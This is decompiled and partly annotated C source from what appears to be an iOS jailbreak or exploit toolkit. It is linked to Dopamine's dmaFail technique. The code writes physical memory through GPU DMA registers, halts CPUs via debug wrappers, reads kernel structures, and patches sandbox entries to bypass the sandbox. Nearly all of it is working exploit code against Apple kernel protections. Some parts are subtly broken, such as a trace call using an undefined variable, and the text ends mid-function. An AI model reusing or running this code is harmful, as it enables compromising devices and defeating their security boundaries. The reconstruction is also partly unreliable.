// dmaFail cluster: this maps to Dopamine's dmaFail.c DMA-backed PPL physical write path.
//----- (0000000000022D6C) ----------------------------------------------------
__int64 __fastcall dmaFail_physwrite32(struct_krwCtx *krwCtx, __int64 a2, int a3)
{
  __int64 v6; // x23, dmaFail MMIO register base
  char v7; // w25, physical page shift
  __int64 v8; // x28, Dopamine gDMAMask
  __int64 v9; // x20
  __int64 v10; // x24
  __int64 *v11; // x1
  __int64 v12; // x27
  __int64 v13; // x26
  __int64 v14; // x23
  __int64 v15; // x24
  unsigned __int64 v16; // x0
  __int64 v17; // x9
  unsigned __int64 v18; // x8
  int v19; // w25
  __int64 v20; // x8
  __int64 v21; // x28
  __int64 v22; // x8
  __int64 v23; // x8
  unsigned __int16 v24; // w28
  const __int16 *v25; // x9
  __int64 i; // x10
  __int64 v27; // x8
  unsigned __int16 v28; // w25
  const __int16 *v29; // x9
  __int64 j; // x10
  int v31; // w8
  int v32; // w12
  char v33; // w9
  unsigned int v34; // w9
  unsigned int v35; // w10
  unsigned int v36; // w10
  int v37; // w21
  __int64 v39; // [xsp+18h] [xbp-228h]
  volatile uint64_t *v40; // [xsp+20h] [xbp-220h]
  __int64 v41; // [xsp+28h] [xbp-218h]
  __int64 v42; // [xsp+30h] [xbp-210h]
  __int64 v43; // [xsp+40h] [xbp-200h]
  __int64 v44; // [xsp+48h] [xbp-1F8h]
  int has_flag; // [xsp+60h] [xbp-1E0h]
  int v46; // [xsp+64h] [xbp-1DCh]
  unsigned __int64 v47; // [xsp+68h] [xbp-1D8h]
  __int128 v48[4]; // [xsp+70h] [xbp-1D0h] BYREF
  __int64 v49[7]; // [xsp+B0h] [xbp-190h] BYREF
  uint64_t v50[7]; // [xsp+E8h] [xbp-158h] BYREF
  __int128 __s2; // [xsp+120h] [xbp-120h] BYREF
  __int128 v52; // [xsp+130h] [xbp-110h]
  __int128 v53; // [xsp+140h] [xbp-100h]
  __int128 v54; // [xsp+150h] [xbp-F0h]
  __int128 v55[2]; // [xsp+160h] [xbp-E0h] BYREF
  __int128 v56[2]; // [xsp+180h] [xbp-C0h]
  __int128 __s1[4]; // [xsp+1A0h] [xbp-A0h] BYREF
  uint64_t currentLine[8];
  uint64_t previousLine[8];
  uint64_t desiredLine[8];

  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14_A15_DMA_ALT_MASK) )
    v6 = DMAFAIL_DMA_REG_BASE_ALT;
  else
    v6 = DMAFAIL_DMA_REG_BASE_LEGACY;
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14_A15_DMA_ALT_MASK) )
    v7 = 15;
  else
    v7 = DMAFAIL_PHYS_PAGE_SHIFT;
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A16) )
  {
    v8 = DMAFAIL_DMA_MASK_A16;
  }
  else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14_A15_DMA_ALT_MASK) )
  {
    v8 = DMAFAIL_DMA_MASK_ALT;
  }
  else
  {
    v8 = DMAFAIL_DMA_MASK_LEGACY;
  }
  v9 = 708642;
  if ( (unsigned int)dmaFail_set_power_state(krwCtx, 1) )
  {
    v10 = dmaFail_gfx_power_init(krwCtx);
    if ( (uint32_t)v10 )
    {
LABEL_85:
      release_write_semaphore_lock(krwCtx, 4u);
      return v10;
    }
    if ( (unsigned int)physmap_map_cached(krwCtx, v6 | DMAFAIL_DMA_CTRL_MAP_OFFSET, (__int64)v49) )
    {
      v10 = 708642;
      goto LABEL_85;
    }
    if ( (unsigned int)physmap_map_cached(krwCtx, v6 | DMAFAIL_DMA_DATA_MAP_OFFSET, (__int64)v50) )
    {
      v11 = v49;
LABEL_84:
      physmap_unmap_cached(krwCtx, (__int64)v11);
      v10 = v9;
      goto LABEL_85;
    }
    if ( !dmaFail_map_dbgwrap(krwCtx, v6, v48) )
    {
LABEL_83:
      physmap_unmap_cached(krwCtx, (__int64)v49);
      v11 = v50;
      goto LABEL_84;
    }
    v12 = v49[0];
    v13 = v50[0];
    v42 = *(volatile uint64_t *)(v49[0] + DMAFAIL_DMA_CTRL_STATUS_OFFSET);
    v14 = *(volatile uint64_t *)(v50[0] + DMAFAIL_DMA_ADDR_OFFSET);
    v15 = *(volatile uint64_t *)(v50[0] + DMAFAIL_DMA_DATA_OFFSET);
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15_A16_MASK) )
    {
      v39 = *(volatile uint64_t *)(v50[0] + DMAFAIL_DMA_A15_A16_BACKUP_OFFSET);
      v40 = (volatile uint64_t *)(v50[0] + DMAFAIL_DMA_A15_A16_BACKUP_OFFSET);
      *(volatile uint64_t *)(v50[0] + DMAFAIL_DMA_A15_A16_BACKUP_OFFSET) = 1;
    }
    else
    {
      v39 = 0;
      v40 = 0;
    }
    v16 = dmaFail_phystokv_cached(krwCtx, a2 & ~(uint64_t)DMAFAIL_CACHE_LINE_MASK);
    if ( v16 )
    {
      v47 = v42 | DMAFAIL_DMA_CTRL_RESTORE_MASK;
      v17 = ((((-1 << v7) & DMAFAIL_DMA_ADDR_TTE_KEEP_BIT) ^ DMAFAIL_DMA_ADDR_TTE_LOW_MASK) & (unsigned int)v16) | DMAFAIL_DMA_ADDR_VALID;
      v41 = (v16 >> DMAFAIL_DMA_A15_ADDR_HASH_SHIFT) & DMAFAIL_DMA_A15_ADDR_HASH_MASK;
      v18 = v16 >> v7;
      v19 = 0;
      v20 = v18 & v8;
      v21 = a2 & DMAFAIL_CACHE_LINE_MASK;
      v43 = v20 << DMAFAIL_PHYS_UPPER_SHIFT;
      v44 = v17;
      while ( 1 )
      {
        if ( !(unsigned int)krw_read_thunk(krwCtx, a2 & ~(uint64_t)DMAFAIL_CACHE_LINE_MASK, DMAFAIL_CACHE_LINE_SIZE, currentLine) )
        {
LABEL_72:
          v37 = 0;
          goto LABEL_76;
        }
        if ( v19 )
        {
          if ( !memcmp(previousLine, currentLine, DMAFAIL_CACHE_LINE_SIZE) )
            goto LABEL_30;
          if ( !memcmp(currentLine, desiredLine, DMAFAIL_CACHE_LINE_SIZE) || *(uint32_t *)((char *)currentLine + v21) == a3 )
          {
            v37 = 0;
            v9 = 0;
            goto LABEL_76;
          }
        }
        memcpy(previousLine, currentLine, DMAFAIL_CACHE_LINE_SIZE);
        memcpy(desiredLine, currentLine, DMAFAIL_CACHE_LINE_SIZE);
        *(uint32_t *)((char *)desiredLine + v21) = a3;
LABEL_30:
        if ( !(unsigned int)dmaFail_dbgwrap_halt_cpu(krwCtx, (__int64)v48) )
          goto LABEL_72;
        *(volatile uint64_t *)(v12 + DMAFAIL_DMA_CTRL_STATUS_OFFSET) |= DMAFAIL_DMA_CTRL_BUSY_BITS;
        while ( (~*(volatile uint64_t *)(v12 + DMAFAIL_DMA_CTRL_STATUS_OFFSET) & DMAFAIL_DMA_CTRL_BUSY_BITS) != 0 )
          semaphore_timedwait_ns(krwCtx, 0x64u);
        *(volatile uint64_t *)(v12 + DMAFAIL_DMA_ENABLE_OFFSET) &= ~DMAFAIL_DMA_ENABLE_BIT;
        *(volatile uint64_t *)(v12 + DMAFAIL_DMA_CTRL_STATUS_OFFSET) &= v47;
        while ( (*(volatile uint64_t *)(v12 + DMAFAIL_DMA_CTRL_STATUS_OFFSET) & DMAFAIL_DMA_CTRL_BUSY_BITS) != 0 )
          semaphore_timedwait_ns(krwCtx, 0x64u);
        v22 = 0;
        *(volatile uint64_t *)(v13 + DMAFAIL_DMA_ADDR_OFFSET) = v44;
        do
        {
          *(volatile uint64_t *)(v13 + DMAFAIL_DMA_DATA_OFFSET) = *(uint64_t *)((char *)desiredLine + v22);
          v22 += 8;
        }
        while ( v22 != DMAFAIL_CACHE_LINE_SIZE );
        v23 = 0;
        v24 = 0;
        v25 = dmaFail_sbox;
        do
        {
          for ( i = 0; i != 32; ++i )
          {
            if ( ((((uint32_t *)desiredLine)[v23] >> i) & 1) != 0 )
              v24 ^= v25[i];
          }
          ++v23;
          v25 += 32;
        }
        while ( v23 != 8 );
        v46 = v19;
        v27 = 0;
        v28 = 0;
        v29 = dmaFail_sbox;
        do
        {
          for ( j = 0; j != 32; ++j )
          {
            if ( ((((uint32_t *)desiredLine)[v27 + 8] >> j) & 1) != 0 )
              v28 ^= v29[j];
          }
          ++v27;
          v29 += 32;
        }
        while ( v27 != 8 );
        has_flag = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_MASK);
        if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14_A15_DMA_ALT_MASK) && (v31 = v41 | (v24 & DMAFAIL_DMA_HASH1_A15_A16_KEEP_MASK), v31 != v24) )
        {
          v34 = 10;
          v32 = has_flag;
          do
          {
            v35 = (unsigned __int16)(v31 ^ v24) ^ ((unsigned __int16)(v31 ^ v24) >> 8);
            v36 = v35 ^ (v35 >> 4) ^ ((v35 ^ (v35 >> 4)) >> 2);
            if ( ((v36 ^ (v36 >> 1)) & 1) == 0 )
              break;
            v31 ^= 1 << --v34;
          }
          while ( v34 > 5 );
        }
        else
        {
          LOWORD(v31) = v24;
          v32 = has_flag;
        }
        v33 = DMAFAIL_DMA_HASH1_INDEX_LEGACY;
        if ( !v32 )
          v33 = DMAFAIL_DMA_HASH1_INDEX_A15_A16;
        *(volatile uint64_t *)(v13 + DMAFAIL_DMA_DATA_OFFSET) = (v43 & DMAFAIL_DMA_TARGET_UPPER_MASK)
                              | ((unsigned __int64)v28 << DMAFAIL_DMA_HASH2_SHIFT)
                              | ((unsigned __int64)(unsigned __int16)v31 << v33)
                              | 0x1F;
        *(volatile uint64_t *)(v12 + DMAFAIL_DMA_CTRL_STATUS_OFFSET) |= DMAFAIL_DMA_CTRL_BUSY_BITS;
        while ( (~*(volatile uint64_t *)(v12 + DMAFAIL_DMA_CTRL_STATUS_OFFSET) & DMAFAIL_DMA_CTRL_BUSY_BITS) != 0 )
          semaphore_timedwait_ns(krwCtx, 0x64u);
        *(volatile uint64_t *)(v12 + DMAFAIL_DMA_ENABLE_OFFSET) |= DMAFAIL_DMA_ENABLE_BIT;
        v21 = a2 & DMAFAIL_CACHE_LINE_MASK;
        if ( !(unsigned int)krw_read_thunk(krwCtx, a2, 4, (char *)currentLine + v21) )
          goto LABEL_74;
        if ( *(uint32_t *)((char *)currentLine + (a2 & DMAFAIL_CACHE_LINE_MASK)) == a3 )
        {
          v9 = 0;
LABEL_74:
          v37 = 1;
          goto LABEL_76;
        }
        *(volatile uint64_t *)(v12 + DMAFAIL_DMA_CTRL_STATUS_OFFSET) &= v47;
        while ( (*(volatile uint64_t *)(v12 + DMAFAIL_DMA_CTRL_STATUS_OFFSET) & DMAFAIL_DMA_CTRL_BUSY_BITS) != 0 )
          semaphore_timedwait_ns(krwCtx, 0x64u);
        if ( (dmaFail_dbgwrap_unhalt_cpu(krwCtx, (__int64)v48) & 1) == 0 )
          goto LABEL_74;
        v19 = v46 + 1;
        if ( v46 == 15 )
          goto LABEL_72;
      }
    }
    v37 = 0;
LABEL_76:
    if ( v42 && *(volatile uint64_t *)(v12 + DMAFAIL_DMA_CTRL_STATUS_OFFSET) != v42 )
      *(volatile uint64_t *)(v12 + DMAFAIL_DMA_CTRL_STATUS_OFFSET) &= v42 | DMAFAIL_DMA_CTRL_RESTORE_MASK;
    *(volatile uint64_t *)(v13 + DMAFAIL_DMA_ADDR_OFFSET) = v14;
    *(volatile uint64_t *)(v13 + DMAFAIL_DMA_DATA_OFFSET) = v15;
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15_A16_MASK) )
    {
      *v40 = v39;
      if ( (v37 & 1) == 0 )
      {
LABEL_82:
        physmap_unmap_cached(krwCtx, (__int64)v48);
        goto LABEL_83;
      }
    }
    else if ( !v37 )
    {
      goto LABEL_82;
    }
    dmaFail_dbgwrap_unhalt_cpu(krwCtx, (__int64)v48);
    goto LABEL_82;
  }
  return v9;
}
// 43490: using guessed type __int16 dmaFail_sbox[3];

//----- (0000000000023348) ----------------------------------------------------
__int64 __fastcall dmaFail_set_power_state(struct_krwCtx *krwCtx, int a2)
{
  __int64 v3; // x8
  __int64 v4; // x20
  uint64_t v5; // x8

  if ( a2 )
  {
    v3 = krwCtx->mappedKernelRegion;
    if ( v3 )
    {
      if ( krwCtx->mappedKernelSize )
      {
        v4 = *(uint64_t *)(v3 + 336);
        if ( v4 )
        {
          v5 = (mach_absolute_time() - v4) * krwCtx->timebase.numer / krwCtx->timebase.denom;
          if ( v5 <= 0x1312CFF )
            semaphore_timedwait_ns(krwCtx, 1000 * (20 - (unsigned int)v5 / 0xF4240));
        }
      }
    }
    if ( (unsigned int)acquire_write_semaphore_lock(krwCtx, 4u, 0x3E8u) )
      return 0;
    if ( krwCtx->mappedKernelRegion )
    {
      if ( krwCtx->mappedKernelSize )
        *(uint64_t *)(krwCtx->mappedKernelRegion + 336LL) = mach_absolute_time();
    }
  }
  else
  {
    release_write_semaphore_lock(krwCtx, 4u);
  }
  return 1;
}

//----- (0000000000023424) ----------------------------------------------------
__int64 __fastcall dmaFail_gfx_power_init(struct_krwCtx *krwCtx)
{
  uint32_t numer; // s8
  uint32_t denom; // s9
  unsigned __int64 paddr; // x21
  uint64_t start; // x20
  int command; // w21
  __int64 regOffset; // x22
  __int64 mapResult; // x0
  uint64_t deadline; // x20
  uint64_t v16[7]; // [xsp+8h] [xbp-70h] BYREF
  struct mach_timebase_info info; // [xsp+38h] [xbp-38h] BYREF

  memset(&info, 0, sizeof(info));
  mach_timebase_info(&info);
  numer = info.numer;
  denom = info.denom;
  start = mach_absolute_time();

  paddr = 0x23B080000LL;
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A16) )
  {
    paddr = 0x23B700000LL;
  }
  else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15) )
  {
    paddr = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15_DMA_ALT) ? 0x404E80000LL : 0x23B700000LL;
  }
  else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14) )
  {
    paddr = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14_DMA_ALT) ? 0x28E580000LL : 0x23B700000LL;
  }
  else if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13) && !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12) )
  {
    return 708642;
  }

  {
    register struct_krwCtx *x0 asm("x0") = krwCtx;
    register unsigned __int64 x1 asm("x1") = paddr;
    register __int64 x2 asm("x2") = (__int64)v16;
    asm volatile("bl _physmap_map_cached"
                 : "+r"(x0)
                 : "r"(x1), "r"(x2)
                 : "x3", "x4", "x5", "x6", "x7", "x8", "x9", "x10", "x11", "x12", "x13", "x14", "x15", "x16", "x17",
                   "v0", "v1", "v2", "v3", "v4", "v5", "v6", "v7", "memory", "cc");
    mapResult = (__int64)x0;
  }
  if ( (unsigned int)mapResult )
    return 708642;

  command = 0x1F0023FF;
  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A16) )
  {
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15) )
    {
      if ( (int)number_of_cpus() < 8 )
      {
        regOffset = 0x3C8LL;
        goto LABEL_33;
      }
      regOffset = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15_DMA_ALT) ? 0x108LL : 0x430LL;
    }
    else
    {
      if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14) )
      {
        if ( (int)number_of_cpus() < 8 )
        {
          regOffset = 0x3D0LL;
          goto LABEL_33;
        }
        regOffset = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14_DMA_ALT) ? 0x3C0LL : 0x3F8LL;
      }
      else
      {
        command = 0x1F0003FF;
        if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13) )
        {
          regOffset = 0x390LL;
          goto LABEL_33;
        }
        if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12) )
        {
          physmap_unmap_cached(krwCtx, (__int64)v16);
          return 708642;
        }
        regOffset = (unsigned int)number_of_cpus() == 8 ? 0x3F8LL : 0x388LL;
      }
    }
    goto LABEL_33;
  }
  regOffset = 0x408LL;
LABEL_33:
  if ( (~*(uint32_t *)(v16[0] + regOffset) & 0xF) != 0 )
  {
    deadline = (unsigned __int64)((double)denom / (double)numer * 1000000.0 * 1000.0 + (double)start);
    *(uint32_t *)(regOffset + v16[0]) = command;
    while ( mach_absolute_time() < deadline && (~*(uint32_t *)(v16[0] + regOffset) & 0xF) != 0 )
      ;
    semaphore_timedwait_ns(krwCtx, 0x3E8u);
  }
  physmap_unmap_cached(krwCtx, (__int64)v16);
  return 0;
}

//----- (00000000000236A4) ----------------------------------------------------
// DONE: this matches the orig asm
bool __fastcall dmaFail_map_dbgwrap(struct_krwCtx *krwCtx, __int64 a2, __int128 *a3)
{
    bzero(a3, 64);
    int v5 = physmap_map_cached(krwCtx, a2 + DMAFAIL_DBGWRAP_MAP_OFFSET, (__int64)a3);
    if ( v5 )
        physmap_unmap_cached(krwCtx, (__int64)a3);
    return v5 == 0;
}

//----- (0000000000023700) ----------------------------------------------------
__int64 __fastcall dmaFail_phystokv_cached(struct_krwCtx *krwCtx, __int64 a2)
{
    struct {
        uint64_t unused[4];
        volatile __int64 physmapKva;
    } out;
    uint64_t leafMask = krwCtx->pageMask;
    uint64_t maskedPhys = a2 & ~leafMask;
    int ok = pgtable_walk_wrapper(krwCtx, maskedPhys, &out);

    TRACE_DMAFAIL("dmaFail_phystokv_cached ctx=%llx pa=%llx masked=%llx leaf=%llx ok=%d out={%llx,%llx,%llx,%llx,%llx} roots={%llx,%llx} global={%llx,%llx} page=%x flags=%x\n",
                  (unsigned long long)a1,
                  (unsigned long long)a2,
                  (unsigned long long)maskedPhys,
                  (unsigned long long)leafMask,
                  ok,
                  (unsigned long long)out.unused[0],
                  (unsigned long long)out.unused[1],
                  (unsigned long long)out.unused[2],
                  (unsigned long long)out.unused[3],
                  (unsigned long long)out.physmapKva,
                  (unsigned long long)*(uint64_t *)(a1 + 1488),
                  (unsigned long long)*(uint64_t *)(a1 + 1496),
                  (unsigned long long)*(uint64_t *)(a1 + 0x18A8),
                  (unsigned long long)*(uint64_t *)(a1 + 0x18B0),
                  krwCtx->pageSizeOrSomething,
                  *(uint32_t *)a1);

    if ( ok )
    {
        asm volatile("" ::: "memory");
        uint64_t physmapKva = out.physmapKva;
        if (!physmapKva) return 0;
        return (physmapKva & 0xFFFFFFFFC000LL) + (leafMask & a2);
    }
    return 0;
}

//----- (0000000000023760) ----------------------------------------------------
__int64 __fastcall dmaFail_dbgwrap_halt_cpu(struct_krwCtx *krwCtx, __int64 a2)
{
  __int64 v4; // x21
  unsigned __int64 v6; // d0
  unsigned __int64 v7; // d1
  uint64_t v8; // x21
  struct mach_timebase_info info; // [xsp+8h] [xbp-38h] BYREF

  v4 = **(volatile uint64_t **)a2;
  if ( (v4 & 0x90000000) == 0 )
  {
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15_A16_MASK) )
      semaphore_timedwait_ns(krwCtx, 0x3E8u);
    **(volatile uint64_t **)a2 = v4 | 0x80000000LL;
    *(uint8_t *)(a2 + 56) = 1;
    memset(&info, 0, sizeof(info));
    mach_timebase_info(&info);
    LODWORD(v6) = info.denom;
    LODWORD(v7) = info.numer;
    v8 = (unsigned __int64)((double)v6 / (double)v7 * 1000000.0 * 1000.0 + (double)mach_absolute_time());
    while ( mach_absolute_time() < v8 )
    {
      if ( (**(volatile uint64_t **)a2 & 0x10000000) != 0 )
        return 1;
    }
  }
  if ( *(uint8_t *)(a2 + 56) )
    dmaFail_dbgwrap_unhalt_cpu(krwCtx, a2);
  return 0;
}
// 23808: variable 'v6' is possibly undefined
// 2380C: variable 'v7' is possibly undefined

//----- (000000000002385C) ----------------------------------------------------
uint32_t __fastcall dmaFail_dbgwrap_unhalt_cpu(struct_krwCtx *krwCtx, __int64 a2)
{
  unsigned __int64 v4; // x21
  unsigned __int64 v5; // d0
  unsigned __int64 v6; // d1
  uint64_t v7; // x20
  struct mach_timebase_info info; // [xsp+8h] [xbp-38h] BYREF

  if ( !*(uint8_t *)(a2 + 56) )
    return 1;
  v4 = (**(volatile uint64_t **)a2 & 0xFFFFFFFF2FFFFFFFLL) | 0x40000000;
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15_A16_MASK) )
    semaphore_timedwait_ns(krwCtx, 0x3E8u);
  **(volatile uint64_t **)a2 = v4;
  memset(&info, 0, sizeof(info));
  mach_timebase_info(&info);
  LODWORD(v5) = info.denom;
  LODWORD(v6) = info.numer;
  v7 = (unsigned __int64)((double)v5 / (double)v6 * 1000000.0 * 1000.0 + (double)mach_absolute_time());
  while ( mach_absolute_time() < v7 )
  {
    if ( (**(volatile uint64_t **)a2 & 0x10000000) == 0 )
    {
      *(uint8_t *)(a2 + 56) = 0;
      return 1;
    }
  }
  return 0;
}
// 238CC: variable 'v5' is possibly undefined
// 238D0: variable 'v6' is possibly undefined

//----- (0000000000023940) ----------------------------------------------------
__int64 __fastcall kwrite_sandbox_entry(struct_krwCtx *krwCtx, __int64 a2)
{
  void *v3; // x20
  __int64 v4; // x19
  __int64 v6; // [xsp+0h] [xbp-40h] BYREF
  uint64_t v7[3]; // [xsp+8h] [xbp-38h] BYREF
  unsigned int v8; // [xsp+24h] [xbp-1Ch] BYREF
  void *v9; // [xsp+28h] [xbp-18h] BYREF

  v9 = 0;
  v8 = 0;
  if ( !(unsigned int)read_kernel_data_buf(krwCtx, 0, 0, &v9, &v8, 0) )
    return 0xFFFFFFFFLL;
  v6 = 0x786F62646E6153LL;
  v7[0] = a2;
  v3 = v9;
  v7[1] = v9;
  v7[2] = v8;
  v4 = __mac_syscall((__int64)&v6, 1, (__int64)v7);
  if ( v3 )
    free(v3);
  return v4;
}

//----- (00000000000239D8) ----------------------------------------------------
__int64 __fastcall read_kernel_data_buf(struct_krwCtx *krwCtx, uint64_t *a2, uint32_t *a3, uint64_t *a4, uint32_t *a5, int a6)
{
  __int64 result; // x0
  int xnuMajorVersion; // w8
  uint64_t *v13; // x19
  uint32_t *v14; // x22
  __int64 v15; // x25
  __int64 v16; // x27
  __int64 v17; // x28
  unsigned int v18; // w21
  unsigned __int64 xnuVersionPacked; // x9
  unsigned __int64 v20; // x26
  unsigned __int64 v21; // x1
  size_t v22; // x27
  void *v23; // x25
  void *v24; // x24
  unsigned __int64 v25; // x1
  __int64 v26; // x26
  uint32_t *v27; // [xsp+0h] [xbp-70h]
  __int64 address; // [xsp+8h] [xbp-68h] BYREF
  int v29; // [xsp+10h] [xbp-60h] BYREF
  uint32_t __size[3]; // [xsp+14h] [xbp-5Ch] BYREF

  result = 0;
  v29 = 0;
  xnuMajorVersion = krwCtx->xnuMajorVersion;
  if ( xnuMajorVersion > 8019 )
  {
    if ( xnuMajorVersion <= 8795 )
    {
      if ( xnuMajorVersion != 8020 && xnuMajorVersion != 8792 )
        return result;
      goto LABEL_18;
    }
    if ( xnuMajorVersion == 8796 )
    {
LABEL_18:
      v13 = a4;
      v14 = a3;
      v27 = a5;
      v18 = 16;
      v16 = 4;
      v17 = 24;
      v15 = 16;
      goto LABEL_26;
    }
    if ( xnuMajorVersion != 10002 )
      return result;
    v13 = a4;
    v14 = a3;
    v27 = a5;
    v18 = 16;
    v16 = 4;
    v17 = 24;
    v15 = 24;
LABEL_26:
    v20 = krwCtx->gap_0x398;
    result = validate_kaddr_range(krwCtx, v20);
    if ( !result )
      return result;
    if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8020, 100, 0, 0, 0) )
    {
      v21 = v20 + v17;
    }
    else
    {
      result = kread_physmap_decorated(krwCtx, v20 + v15, (unsigned __int64 *)&address);
      if ( !(uint32_t)result )
        return result;
      result = validate_kaddr_range(krwCtx, address);
      if ( !result )
        return result;
      v21 = address + v17;
    }
    result = kread_physmap_decorated(krwCtx, v21, (unsigned __int64 *)&address);
    if ( !(uint32_t)result )
      return result;
    if ( address )
    {
      result = validate_kaddr_range(krwCtx, address);
      address = result;
      if ( !result )
        return result;
      result = krw_read_thunk(krwCtx, v16 - v18 + result, 4, &v29);
      if ( !(uint32_t)result )
        return result;
      v22 = v29 - v18;
      v29 = v22;
      if ( (unsigned int)(v22 - 1) > 0x3FF )
        return 0;
      result = (__int64)malloc(v22);
      if ( !result )
        return result;
      v23 = (void *)result;
      if ( !(unsigned int)krw_read_thunk(krwCtx, address, v22, (void *)result) )
      {
        v24 = 0;
LABEL_60:
        free(v23);
LABEL_61:
        if ( v24 )
          free(v24);
        return 0;
      }
    }
    else
    {
      v23 = 0;
    }
    if ( !a2 && !v14 )
    {
      *v13 = v23;
      *v27 = v29;
      return 1;
    }
    if ( a6 )
    {
      v25 = find_appleevent_kaddr(krwCtx);
      address = v25;
      if ( !v25 )
        goto LABEL_58;
    }
    else
    {
      if ( !kread_physmap_decorated(krwCtx, v20, (unsigned __int64 *)&address) )
        goto LABEL_58;
      v25 = address;
    }
    if ( kread_physmap_decorated(krwCtx, v25, (unsigned __int64 *)&__size[1]) )
    {
      v24 = 0;
      if ( (unsigned int)krw_read_thunk(krwCtx, address + krwCtx->stride_0x168, 4, __size) )
      {
        v26 = __size[0];
        if ( __size[0] <= 0x80000u )
        {
          v24 = malloc(__size[0]);
          if ( v24 )
          {
            if ( (unsigned int)krw_read_thunk(krwCtx, *(__int64 *)&__size[1], v26, v24) )
            {
              *v13 = v23;
              *v27 = v29;
              result = 1;
              if ( !a2 || !v14 )
                return result;
              *a2 = v24;
              *v14 = __size[0];
              return 1;
            }
          }
        }
      }
LABEL_59:
      if ( !v23 )
        goto LABEL_61;
      goto LABEL_60;
    }
LABEL_58:
    v24 = 0;
    goto LABEL_59;
  }
  if ( xnuMajorVersion == 6153 )
  {
    v13 = a4;
    v14 = a3;
    v27 = a5;
    v15 = 0;
    xnuVersionPacked = krwCtx->xnuVersionPacked;
    if ( xnuVersionPacked <= XNU_VERSION_PACKED(6153, 120, 30, 1023, 1023) )
      v18 = 32;
    else
      v18 = 16;
    if ( xnuVersionPacked <= XNU_VERSION_PACKED(6153, 120, 30, 1023, 1023) )
      v16 = 8;
    else
      v16 = 4;
    v17 = 48;
    goto LABEL_26;
  }
  if ( xnuMajorVersion == 7195 || xnuMajorVersion == 8019 )
  {
    v13 = a4;
    v14 = a3;
    v27 = a5;
    v15 = 16;
    v16 = 4;
    v17 = 72;
    v18 = 16;
    goto LABEL_26;
  }
  return result;
}

//----- (0000000000023D30) ----------------------------------------------------
mach_vm_address_t __fastcall setup_sandbox_bypass(struct_krwCtx *krwCtx, char a2)
{
  // struct_krwCtx *krwCtx; // x19
  mach_vm_address_t result; // x0
  unsigned __int64 v5; // x1
  int v6; // w20
  mach_vm_address_t v7; // x0
  __int64 v8; // x2
  __int64 v10; // [xsp+0h] [xbp-70h] BYREF
  unsigned int v11; // [xsp+Ch] [xbp-64h] BYREF
  void *v12; // [xsp+10h] [xbp-60h] BYREF
  unsigned int v13; // [xsp+1Ch] [xbp-54h] BYREF
  void *v14; // [xsp+20h] [xbp-50h] BYREF
  uint64_t v15[4]; // [xsp+28h] [xbp-48h] BYREF

  result = necp_set_opt_string_6(krwCtx, mach_task_self_);
  if ( !(uint32_t)result )
    return result;
  if ( (a2 & 1) != 0 )
  {
    if ( validate_kaddr_range(krwCtx, krwCtx->gap_0x398)
      && !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_MOBILEBACKUP_SANDBOX_PATCHED) )
    {
      result = necp_set_opt_string_7(krwCtx, krwCtx->gap_0x37C_size4, 0);
      if ( (uint32_t)result )
      {
        v5 = krwCtx->cachedSelfTaskKaddr;
        if ( !v5 )
        {
          v15[0] = 0;
          v5 = get_kobj_and_resolve_kaddr(krwCtx, mach_task_self_, v15);
          krwCtx->cachedSelfTaskKaddr = v5;
          krwCtx->gap_0x18E8 = v15[0];
        }
        vm_attr_increment_offset_bounded(krwCtx, v5, 10);
        if ( krwCtx->xnuMajorVersion < 7195 )
        {
          v14 = 0;
          v13 = 0;
          v12 = 0;
          v11 = 0;
          if ( (unsigned int)read_kernel_data_buf(krwCtx, &v14, &v13, &v12, &v11, 1) )
          {
            if ( (unsigned int)parse_necp_opt_struct(krwCtx, (__int16 *)v14, v13) )
            {
              v10 = 0x786F62646E6153LL;
              v15[0] = v14;
              v15[1] = v13;
              v15[2] = v12;
              v15[3] = v11;
              v6 = __mac_syscall((__int64)&v10, 0, (__int64)v15);
            }
            else
            {
              v6 = -1;
            }
            if ( v14 )
              free(v14);
            if ( v12 )
              free(v12);
          }
          else
          {
            v6 = -1;
          }
        }
        else
        {
          strcpy((char *)v15, "MobileBackup");
          v6 = kwrite_sandbox_entry(krwCtx, (__int64)v15);
        }
        necp_set_opt_string_7(krwCtx, krwCtx->gap_0x37C_size4, krwCtx->gap_0x3A8);
        if ( !v6 )
          krw_ctx_set_flag(krwCtx, KRW_CTX_FLAG_MOBILEBACKUP_SANDBOX_PATCHED);
        return v6 == 0;
      }
      return result;
    }
    return 1;
  }
  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_MOBILEBACKUP_SANDBOX_PATCHED) )
    return 1;
  v7 = get_task_kobj_and_walk_chain(krwCtx, mach_task_self_);
  if ( v7 )
  {
    v8 = krwCtx->gap_0x18E8;
    if ( !v8 )
      return 0;
    result = kwrite64_dispatch(krwCtx, v7, v8);
    if ( (uint32_t)result )
    {
